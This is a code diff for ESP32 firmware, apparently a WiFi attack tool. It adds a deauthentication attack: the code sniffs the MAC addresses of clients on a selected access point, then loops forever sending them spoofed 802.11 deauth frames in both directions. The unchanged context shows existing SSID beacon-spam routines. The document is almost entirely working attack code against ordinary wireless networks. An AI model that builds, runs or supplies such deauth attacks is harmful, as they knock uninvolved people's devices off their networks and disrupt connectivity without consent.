@@ -194,7 +194,7 @@ void WiFiModule::broadcastRickroll()
 void WiFiModule::InitRandomSSIDAttack()
 {
 #ifdef OLD_LED
-    rgbmodule->setColor(1, 1, 0);
+    rgbmodule->setColor(0, 1, 1);
 #endif
     while (wifi_initialized)
     {
@@ -238,6 +238,33 @@ void WiFiModule::broadcastSetSSID(const char* ESSID) {
     esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
     esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
     packets_sent + 6;
+}
+
+void WiFiModule::broadcastDeauthAP(){
+  #ifdef OLD_LED
+    rgbmodule->setColor(0, 1, 1);
+  #endif
+
+  while(wifi_initialized){
+    for(int i = 0; i < access_points->size(); i++){
+     AccessPoint ap = access_points->get(i);
+     if(ap.selected){
+      target_ap = ap;
+      break;
+     }
+    }
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_filter(&filt);
+    esp_wifi_set_promiscuous_rx_cb(&collectMacAddressCallback);
+    esp_wifi_set_channel(target_ap.channel, WIFI_SECOND_CHAN_NONE);
+    delay(10000);
+    esp_wifi_set_promiscuous(false);
+    for(int i = 0; i < target_macs.size(); i++){
+      uint8_t *mac = target_macs.get(i);
+      sendDeauthFrame(target_ap.bssid, target_ap.channel, mac);
+    }
+  }
+
 }
 
 void WiFiModule::RunSetup()
@@ -299,4 +326,67 @@ void WiFiModule::broadcastRandomSSID() {
     esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
     esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
     packets_sent + 6;
+}
+
+void WiFiModule::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  delay(1);
+  
+  // Build AP source packet
+  deauth_frame_default[4] = mac[0];
+  deauth_frame_default[5] = mac[1];
+  deauth_frame_default[6] = mac[2];
+  deauth_frame_default[7] = mac[3];
+  deauth_frame_default[8] = mac[4];
+  deauth_frame_default[9] = mac[5];
+  
+  deauth_frame_default[10] = bssid[0];
+  deauth_frame_default[11] = bssid[1];
+  deauth_frame_default[12] = bssid[2];
+  deauth_frame_default[13] = bssid[3];
+  deauth_frame_default[14] = bssid[4];
+  deauth_frame_default[15] = bssid[5];
+
+  deauth_frame_default[16] = bssid[0];
+  deauth_frame_default[17] = bssid[1];
+  deauth_frame_default[18] = bssid[2];
+  deauth_frame_default[19] = bssid[3];
+  deauth_frame_default[20] = bssid[4];
+  deauth_frame_default[21] = bssid[5];      
+
+  // Send packet
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+
+  packets_sent = packets_sent + 3;
+
+  // Build AP dest packet
+  deauth_frame_default[4] = bssid[0];
+  deauth_frame_default[5] = bssid[1];
+  deauth_frame_default[6] = bssid[2];
+  deauth_frame_default[7] = bssid[3];
+  deauth_frame_default[8] = bssid[4];
+  deauth_frame_default[9] = bssid[5];
+  
+  deauth_frame_default[10] = mac[0];
+  deauth_frame_default[11] = mac[1];
+  deauth_frame_default[12] = mac[2];
+  deauth_frame_default[13] = mac[3];
+  deauth_frame_default[14] = mac[4];
+  deauth_frame_default[15] = mac[5];
+
+  deauth_frame_default[16] = mac[0];
+  deauth_frame_default[17] = mac[1];
+  deauth_frame_default[18] = mac[2];
+  deauth_frame_default[19] = mac[3];
+  deauth_frame_default[20] = mac[4];
+  deauth_frame_default[21] = mac[5];      
+
+  // Send packet
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+
+  packets_sent = packets_sent + 3;
 }
